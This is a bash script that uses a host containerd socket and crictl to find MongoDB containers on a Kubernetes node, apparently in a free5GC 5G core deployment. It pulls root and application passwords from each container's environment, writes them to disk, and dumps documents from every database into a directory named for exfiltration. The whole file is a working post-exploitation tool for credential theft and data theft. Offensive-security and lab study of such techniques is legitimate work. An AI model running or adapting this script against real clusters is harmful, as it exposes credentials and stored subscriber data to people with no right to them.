#!/usr/bin/env bash
set -Eeuo pipefail

trap 'echo "[ERR] (line $LINENO) command: $BASH_COMMAND" >&2' ERR

RUNTIME_SOCKET="${CRICTL_RUNTIME_PATH:-/host/run/containerd/containerd.sock}"
OUTDIR="${OUTDIR:-/tmp/exfiltration/dbs}"
MONGO_NAME="${MONGO_CONTAINER_NAME:-mongodb}"
DOC_LIMIT="${MONGO_EXFIL_DOC_LIMIT:-100}"

if [[ ! "$DOC_LIMIT" =~ ^[0-9]+$ ]]; then
  echo "Invalid MONGO_EXFIL_DOC_LIMIT=$DOC_LIMIT, falling back to 100" >&2
  DOC_LIMIT=100
fi

if [ -n "${1:-}" ] && ! command -v crictl >/dev/null 2>&1; then
  curl -fsSL https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.30.0/crictl-v1.30.0-linux-amd64.tar.gz | tar zx -C /usr/local/bin
fi

if [ ! -s /etc/crictl.yaml ] && [ "$(id -u)" -eq 0 ]; then
  cat >/etc/crictl.yaml <<YAML
runtime-endpoint: unix://${RUNTIME_SOCKET}
image-endpoint: unix://${RUNTIME_SOCKET}
timeout: 10
debug: false
YAML
fi

mkdir -p "$OUTDIR"

command -v crictl >/dev/null 2>&1 || { echo "ERROR: crictl not found"; exit 1; }
command -v jq >/dev/null 2>&1 || { echo "ERROR: jq not found"; exit 1; }

get_env_value() {
  local name="$1"
  awk -F= -v key="$name" '$1 == key { sub(/^[^=]*=/, ""); print; exit }'
}

first_csv_value() {
  awk -F, '{ print $1 }'
}

json_escape() {
  sed 's/\\/\\\\/g; s/"/\\"/g'
}

discover_mongodb_containers() {
  local cid json name image pod labels_match

  {
    crictl ps -q --name "$MONGO_NAME" 2>/dev/null || true

    for cid in $(crictl ps -q 2>/dev/null || true); do
      json="$(crictl inspect "$cid" 2>/dev/null || true)"
      [ -n "$json" ] || continue

      name="$(printf '%s' "$json" | jq -r '.status.metadata.name // ""')"
      image="$(printf '%s' "$json" | jq -r '.status.image.image // ""')"
      pod="$(printf '%s' "$json" | jq -r '.status.labels["io.kubernetes.pod.name"] // ""')"
      labels_match="$(printf '%s' "$json" | jq -r '
        [
          .status.labels["app.kubernetes.io/name"],
          .status.labels["app.kubernetes.io/component"],
          .status.labels["app"]
        ] | map(select(. != null)) | join(" ")
      ')"

      if printf '%s\n%s\n%s\n%s\n' "$name" "$image" "$pod" "$labels_match" | grep -qi 'mongodb'; then
        printf '%s\n' "$cid"
      fi
    done
  } | sort -u
}

mapfile -t CIDS < <(discover_mongodb_containers)
if [[ ${#CIDS[@]} -eq 0 ]]; then
  echo "No MongoDB containers found"
  exit 0
fi

echo "Found ${#CIDS[@]} MongoDB container(s). Dumping free5GC data..."

for CID in "${CIDS[@]}"; do
  if ! INSPECT_JSON="$(crictl inspect "$CID")"; then
    echo "[SKIP] inspect failed for $CID" >&2
    continue
  fi

  ENV_OUTPUT="$(crictl exec "$CID" env 2>/dev/null || true)"
  ROOT_USER="$(printf '%s\n' "$ENV_OUTPUT" | get_env_value MONGODB_ROOT_USER)"
  ROOT_PASS="$(printf '%s\n' "$ENV_OUTPUT" | get_env_value MONGODB_ROOT_PASSWORD)"
  APP_USER="$(printf '%s\n' "$ENV_OUTPUT" | get_env_value MONGODB_EXTRA_USERNAMES | first_csv_value)"
  APP_PASS="$(printf '%s\n' "$ENV_OUTPUT" | get_env_value MONGODB_EXTRA_PASSWORDS | first_csv_value)"
  APP_DB="$(printf '%s\n' "$ENV_OUTPUT" | get_env_value MONGODB_EXTRA_DATABASES | first_csv_value)"

  ROOT_USER="${ROOT_USER:-root}"
  APP_DB="${APP_DB:-free5gc}"

  NS="$(printf '%s' "$INSPECT_JSON" | jq -r '.status.labels["io.kubernetes.pod.namespace"] // "default"')"
  POD="$(printf '%s' "$INSPECT_JSON" | jq -r '.status.labels["io.kubernetes.pod.name"] // "mongodb"')"
  CNAME="$(printf '%s' "$INSPECT_JSON" | jq -r '.status.metadata.name // "mongodb"')"
  SHORTCID="${CID:0:12}"
  SAFE_NS="${NS//\//_}"
  SAFE_POD="${POD//\//_}"
  SAFE_CNAME="${CNAME//\//_}"
  PREFIX="$OUTDIR/${SAFE_NS}-${SAFE_POD}-${SAFE_CNAME}-${SHORTCID}"

  printf '%s\n' "$ENV_OUTPUT" >"${PREFIX}.env.txt"
  printf '%s\n' "$INSPECT_JSON" >"${PREFIX}.inspect.json"

  MONGO_CMD="$(crictl exec "$CID" sh -c 'command -v mongosh || command -v mongo || true' 2>/dev/null | tail -n1)"
  if [[ -z "$MONGO_CMD" ]]; then
    echo "[SKIP] mongosh/mongo not present in $CID" >&2
    continue
  fi

  AUTH_ARGS=()
  if [[ -n "$ROOT_PASS" ]]; then
    AUTH_ARGS=(--authenticationDatabase admin -u "$ROOT_USER" -p "$ROOT_PASS")
  elif [[ -n "$APP_USER" && -n "$APP_PASS" ]]; then
    AUTH_ARGS=(--authenticationDatabase "$APP_DB" -u "$APP_USER" -p "$APP_PASS")
  fi

  SAFE_APP_DB="$(printf '%s' "$APP_DB" | json_escape)"
  JS="$(cat <<JS
const maxDocs = Number(${DOC_LIMIT});
const fallbackDb = "${SAFE_APP_DB}";
let dbNames = [];
try {
  dbNames = db.adminCommand({ listDatabases: 1 }).databases.map((item) => item.name);
} catch (err) {
  print("// listDatabases failed, falling back to " + fallbackDb + ": " + err);
  dbNames = [fallbackDb];
}
for (const dbName of dbNames) {
  if (!dbName || (["admin", "config", "local"].includes(dbName) && dbName !== fallbackDb)) {
    continue;
  }
  const currentDb = db.getSiblingDB(dbName);
  print("## database: " + dbName);
  let collections = [];
  try {
    collections = currentDb.getCollectionNames();
  } catch (err) {
    print("// cannot list collections for " + dbName + ": " + err);
    continue;
  }
  for (const collectionName of collections) {
    print("### collection: " + dbName + "." + collectionName);
    try {
      currentDb.getCollection(collectionName).find({}).limit(maxDocs).forEach((doc) => printjson(doc));
    } catch (err) {
      print("// cannot dump " + dbName + "." + collectionName + ": " + err);
    }
  }
}
JS
)"

  OUTFILE="${PREFIX}.mongo.txt"
  echo "-> $NS/$POD ($CNAME $SHORTCID) db=$APP_DB -> $OUTFILE"
  if ! crictl exec -i "$CID" "$MONGO_CMD" --quiet "${AUTH_ARGS[@]}" --eval "$JS" >"$OUTFILE" 2>"$OUTFILE.err"; then
    echo "[ERR] MongoDB dump failed for $CID. See $OUTFILE.err" >&2
    continue
  fi

  [[ -s "$OUTFILE.err" ]] || rm -f "$OUTFILE.err"
done

echo "Done. Output in: $OUTDIR"
